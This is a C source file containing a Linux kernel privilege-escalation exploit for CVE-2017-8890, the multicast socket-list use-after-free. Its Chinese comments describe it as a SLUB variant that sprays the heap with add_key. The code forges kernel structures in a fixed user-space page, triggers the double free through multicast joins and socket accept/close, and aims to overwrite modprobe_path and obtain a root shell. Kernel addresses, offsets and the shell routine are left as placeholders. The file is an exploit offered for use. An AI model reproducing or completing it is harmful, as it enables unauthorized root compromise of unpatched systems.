/*
 * 类似于cve-2017-8890_v1, 只是应该更适用SLUB的场景
 * 而v0, v1应该更适用SLAB的场景
 * 更改堆喷方式, 使用add_key来进行小对象堆喷
 */
#define	_GNU_SOURCE
#include <netinet/ip.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>
#include "./keyutils.h"

#define	__rcu

struct rcu_head {
	struct rcu_head *next;
	void (*func)(struct rcu_head *head);
};

struct ip_sf_socklist {
	unsigned int	sl_max;
	unsigned int	sl_count;
	struct rcu_head rcu;
	unsigned int	sl_addr[0];
};

struct ip_mc_socklist {
	struct ip_mc_socklist	*next;
	struct ip_mreqn		multi;
	unsigned int		sfmode;
	struct ip_sf_socklist	*sflist;
	struct rcu_head		rcu;
};

key_serial_t keyring = KEY_SPEC_USER_KEYRING;
void *fake_rcu_head = 0x40000000;
int pipes[2];
static int modify_done = 0;
#define	MODPROBE_PATH	`<todo>`
static int modify_modprobe(void)
{
	if (write(pipes[1], `<todo>`, 8) == -1)
		return -1;
	if (read(pipes[0], MODPROBE_PATH, 8) == -1)
		return -1;
	return 0;
}
#define	KERNEL_SOCK_IOCTL	`<todo>`
/*
 * if kernel_sock_ioctl start as: push %rbp, ...
 * then, ret jop should be like this:
 * add $0x8, %rsp
 * xor %eax, %eax
 * pop %rbx
 * pop %r12
 * pop %rbp
 * retq
 */
#define	KERNEL_SOCK_IOCTL_RET	`<todo>`
#define	SOCK_OP_OFFSET	`<todo>`
#define	SOCK_IOCTL_OFFSET	`<todo>`
static int prepare(void)
{
	fake_rcu_head = mmap(fake_rcu_head, 4096, PROT_READ | PROT_WRITE,
				MAP_FIXED | MAP_ANON | MAP_SHARED, -1, 0);
	if (fake_rcu_head == MAP_FAILED)
		return -1;

	memset(fake_rcu_head, 0, 4096);
	struct ip_mc_socklist *iml = fake_rcu_head;
	iml->rcu.func = KERNEL_SOCK_IOCTL;

	char *fake_sock = (char *)&iml->rcu.next;
	*(size_t *)(fake_sock+SOCK_OP_OFFSET) = fake_sock + 0x100;
	*(size_t *)(fake_sock+0x100+SOCK_IOCTL_OFFSET) = KERNEL_SOCK_IOCTL_RET;

	if (pipe(pipes))
		return -1;
	return 0;
}

static int do_spray(int idx)
{
	char *usertype = "user";
	char userdesc[16];
	memset(userdesc, 0, sizeof(userdesc));
	snprintf(userdesc, 16, "user%d", idx);

	size_t plen = 0x28;
	char userpld[plen];
	memset(userpld, 0, sizeof(userpld));
	struct ip_mc_socklist *iml = userpld;
	iml->rcu.next = fake_rcu_head + 0x20;

	iml = userpld - 0x12;
	iml->rcu.next =  fake_rcu_head + 0x20;

	return syscall(__NR_add_key, usertype, userdesc, userpld,
			plen, keyring);
}

#define	MAX_KEY_COUNT	0x1000
static int accept_times = 4;
static int spray_threads = 0x10;
int spray_switch = 0;
void *spary0(void *arg)
{
	int idx = (int)arg;
	idx = idx * (MAX_KEY_COUNT / spray_threads);

	while (!spray_switch)
		usleep(1000);

	do_spray(idx);

	while (spray_switch != 2)
		usleep(10);

	int i = 0;
	for (i = idx + 1; i < idx + (MAX_KEY_COUNT / spray_threads); i++) {
		do_spray(i);
	}

	while (spray_switch != 3)
		usleep(1000);

	modify_modprobe();

	sleep(0x1000);
	return (void *)0;
}

#define	SFD_CNT 0x80
int servfd[SFD_CNT];
struct sockaddr_in serv_addr;
static unsigned short port = 13578;
static void do_child_connect(int times)
{
	int i = 0;
	int sockfd[times];

	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_family = AF_INET;
	sai.sin_port = htons(port);
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");

	for (i = 0; i < times; i++) {
		sockfd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (connect(sockfd[i],(struct sockaddr *)&sai,sizeof(sai)) == -1) {
			perror("connect");
			return -1;
		}
	}

	sleep(0x10000);
}
static int do_it(void)
{
	int i = 0;
	int err = 0;
	struct group_req req;
	struct sockaddr_in sai;

	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	pthread_t spray_thread_id[spray_threads];
	for (i = 0; i < spray_threads; i++) {
		pthread_create(&spray_thread_id[i], NULL, spary0, i);
	}

	for (i = 0; i < SFD_CNT; i++) {
		memset(&sai, 0, sizeof(sai));
		sai.sin_family = AF_INET;
		sai.sin_port = htons(port+i);
		sai.sin_addr.s_addr = inet_addr("224.0.0.0");
		req.gr_interface = 1;
		memcpy(&req.gr_group, &sai, sizeof(sai));

		servfd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		if (servfd[i] == -1) {
			perror("socket");
			return -1;
		}

		if (setsockopt(servfd[i],SOL_IP,MCAST_JOIN_GROUP,&req,
					sizeof(req)) == -1) {
			perror("setsockopt");
			return -1;
		}
	}

	bind(servfd[0], (struct sockaddr *)&serv_addr, sizeof(serv_addr));

	listen(servfd[0], accept_times);

	int child;
	int connfd[accept_times];
	if ((child = fork()) < 0) {
		perror("fork");
	} else if (child == 0) {
		close(servfd[0]);
		do_child_connect(accept_times);
		exit(0);
	}

	for (i = 0; i < accept_times; i++) {
		connfd[i] = accept(servfd[0], NULL, NULL);
		if (connfd[i] == -1) {
			perror("accept");
			return -1;
		}
	}

	spray_switch = 1;
	if (connfd[0])
		close(connfd[0]);
	for (i = 1; i < SFD_CNT; i++)
		close(servfd[i]);

	usleep(30*1000);
	spray_switch = 2;

	for (i = 1; i < accept_times; i++) {
		close(connfd[i]);
		usleep(30*1000);
	}

	spray_switch = 3;
	modify_modprobe();

	return 0;
}

static int get_root_shell(void)
{
	`<todo>`
	return 0;
}

int main(int argc, char *argv[])
{
	int err;

	err = prepare();
	if (err) {
		fprintf(stderr, "prepare err\n");
		return -1;
	}

	err = do_it();
	if (err) {
		fprintf(stderr, "do_it err\n");
		return -1;
	}

	err = get_root_shell();
	if (err) {
		fprintf(stderr, "get_root_shell err\n");
		return -1;
	}

	return 0;
}
